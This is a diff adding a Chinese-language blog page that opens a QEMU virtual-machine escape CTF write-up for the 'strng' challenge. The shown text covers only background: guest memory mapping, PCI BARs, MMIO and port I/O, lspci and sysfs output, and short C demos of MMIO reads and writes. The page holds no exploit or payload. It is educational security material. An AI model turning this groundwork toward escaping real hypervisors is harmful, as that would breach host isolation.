@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="qemu逃逸初探前言今天是19年的最后一天，本来想发点总结的，合计了一下发现没什么能说的，还是算了，做一下很久之前就想做的题。基本是复现ray-cp师傅的做题过程，中间还有些疑惑的地方。 基础知识地址转换大概看了三道题，题目都是自己写个设备，和qemu共同编译，之后指定这个设备作为device。通过设备的读写漏洞进行逃逸。首先是qemu相关的内存映射，我们的虚拟机分配一块内存(在启动qemu的脚本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="qemu逃逸初探">
+<meta property="og:url" content="http://yoursite.com/2020/01/03/strng/index.html">
+<meta property="og:site_name" content="Ama2in9">
+<meta property="og:description" content="qemu逃逸初探前言今天是19年的最后一天，本来想发点总结的，合计了一下发现没什么能说的，还是算了，做一下很久之前就想做的题。基本是复现ray-cp师傅的做题过程，中间还有些疑惑的地方。 基础知识地址转换大概看了三道题，题目都是自己写个设备，和qemu共同编译，之后指定这个设备作为device。通过设备的读写漏洞进行逃逸。首先是qemu相关的内存映射，我们的虚拟机分配一块内存(在启动qemu的脚本">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/01/03/strng/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/03/strng/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/03/strng/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/03/strng/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/03/strng/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/03/strng/6.png">
+<meta property="og:updated_time" content="2020-01-03T03:55:21.162Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="qemu逃逸初探">
+<meta name="twitter:description" content="qemu逃逸初探前言今天是19年的最后一天，本来想发点总结的，合计了一下发现没什么能说的，还是算了，做一下很久之前就想做的题。基本是复现ray-cp师傅的做题过程，中间还有些疑惑的地方。 基础知识地址转换大概看了三道题，题目都是自己写个设备，和qemu共同编译，之后指定这个设备作为device。通过设备的读写漏洞进行逃逸。首先是qemu相关的内存映射，我们的虚拟机分配一块内存(在启动qemu的脚本">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/03/strng/1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/03/strng/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>qemu逃逸初探 | Ama2in9</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ama2in9</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/03/strng/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Seeing how far I have been.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">qemu逃逸初探
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-01-03 11:54:05 / Modified: 11:55:21" itemprop="dateCreated datePublished" datetime="2020-01-03T11:54:05+08:00">2020-01-03</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/qemu-escape/" itemprop="url" rel="index"><span itemprop="name">qemu escape</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/01/03/strng/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/01/03/strng/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/01/03/strng/" class="leancloud_visitors" data-flag-title="qemu逃逸初探">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="qemu逃逸初探"><a href="#qemu逃逸初探" class="headerlink" title="qemu逃逸初探"></a>qemu逃逸初探</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天是19年的最后一天，本来想发点总结的，合计了一下发现没什么能说的，还是算了，做一下很久之前就想做的题。基本是复现ray-cp师傅的做题过程，中间还有些疑惑的地方。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="地址转换"><a href="#地址转换" class="headerlink" title="地址转换"></a>地址转换</h3><p>大概看了三道题，题目都是自己写个设备，和qemu共同编译，之后指定这个设备作为device。通过设备的读写漏洞进行逃逸。<br>首先是qemu相关的内存映射，我们的虚拟机分配一块内存(在启动qemu的脚本中指定)给qemu进程，这块地址是我们虚拟机的虚拟地址，却是qemu作为一个模拟系统中的物理地址，这个地址再通过地址映射的方式分配给其中的进程使用。图如下所示(抄自ray-cp师傅)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Guest&apos; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&apos;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure>
+<p>如果我们在qemu虚拟机里申请一段地址空间mem，则可以先用qemu里的地址映射计算出其在qemu物理内存地址(在qemu内部查看二进制程序的map基址加上申请地址的偏移)，进而将这个地址作为偏移加上在VMWare内查看map得到的qemu进程基址算出mem在虚拟机的实际地址。  </p>
+<h3 id="pci设备空间"><a href="#pci设备空间" class="headerlink" title="pci设备空间"></a>pci设备空间</h3><p>pci设备有一个配置空间记录设备的详细信息。大小为256字节，前64字节是PCI标准规定的。前16个字节的格式是固定的，包含头部的类型、设备种类、设备的性质以及制造商等，格式如下：</p>
+<p><img src="/2020/01/03/strng/1.png" alt="pci config space"></p>
+<p>比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：</p>
+<p><img src="/2020/01/03/strng/2.png" alt="bar"></p>
+<p>设备可以申请两类地址空间，memory space和I/O space，用BAR的最后一位区别开。<br>当BAR最后一位为0表示这是映射的I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2位表示内存的类型，bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。<br>而相对于I/O内存，当最后一位为1时表示映射的I/O端口。I/O端口一般不支持预取，所以这里是29位的地址。<br>通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。<br>通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，这种情况下CPU需要使用专门的I/O指令如IN/OUT访问I/O端口。<br>在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。</p>
+<p>在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：outb, outw, outl）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。</p>
+<h3 id="查看pci设备"><a href="#查看pci设备" class="headerlink" title="查看pci设备"></a>查看pci设备</h3><p>lspci命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。</p>
+<p>pci设备的寻址是由总线、设备以及功能构成。如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure></p>
+<p>xx:yy:z的格式为总线:设备:功能的格式。</p>
+<p>PCI 设备通过VendorIDs、DeviceIDs、以及Class Codes字段区分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0</span><br><span class="line">Device: 00:03.0</span><br><span class="line">Class:  00ff</span><br><span class="line">Vendor: 1234</span><br><span class="line">Device: 11e9</span><br><span class="line">SVendor:        1af4</span><br><span class="line">SDevice:        1100</span><br><span class="line">PhySlot:        3</span><br><span class="line">Rev:    10</span><br></pre></td></tr></table></figure>
+<p>查看设备的内存空间：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">        Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: fast devsel</span><br><span class="line">        Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">        I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>可以看到该设备有两个空间：BAR0为MMIO空间，地址为febf1000，大小为256；BAR1为PMIO空间，端口地址为0xc050，大小为8。</p>
+<p>我们还可以通过resource文件来查看内存空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  3 root root    0 Dec 31 11:13 .</span><br><span class="line">drwxr-xr-x 11 root root    0 Dec 31 11:13 ..</span><br><span class="line">-rw-r--r--  1 root root 4096 Dec 31 15:29 broken_parity_status</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 class</span><br><span class="line">-rw-r--r--  1 root root  256 Dec 31 15:29 config</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 consistent_dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Dec 31 15:29 d3cold_allowed</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 device</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Dec 31 15:29 enable</span><br><span class="line">lrwxrwxrwx  1 root root    0 Dec 31 15:29 firmware_node -&gt; ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 11:13 irq</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 local_cpulist</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 local_cpus</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 modalias</span><br><span class="line">-rw-r--r--  1 root root 4096 Dec 31 15:29 msi_bus</span><br><span class="line">drwxr-xr-x  2 root root    0 Dec 31 15:29 power</span><br><span class="line">--w--w----  1 root root 4096 Dec 31 15:29 remove</span><br><span class="line">--w--w----  1 root root 4096 Dec 31 15:29 rescan</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 resource</span><br><span class="line">-rw-------  1 root root  256 Dec 31 11:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Dec 31 15:29 resource1</span><br><span class="line">lrwxrwxrwx  1 root root    0 Dec 31 15:29 subsystem -&gt; ../../../bus/pci</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 subsystem_device</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 subsystem_vendor</span><br><span class="line">-rw-r--r--  1 root root 4096 Dec 31 11:13 uevent</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 vendor</span><br></pre></td></tr></table></figure>
+<p><code>resoucre</code>文件包含其它相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）</p>
+<p>每行代表起始地址、结束地址以及标志位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
+<h3 id="qemu访问I-O空间"><a href="#qemu访问I-O空间" class="headerlink" title="qemu访问I/O空间"></a>qemu访问I/O空间</h3><h4 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h4><p>编写内核模块，可以在内核态访问mmio空间，demo如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);</span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure>
+<p>用户态访问主要是通过映射resource0文件实现访问，给定地址可以直接赋值或者取值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">        mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
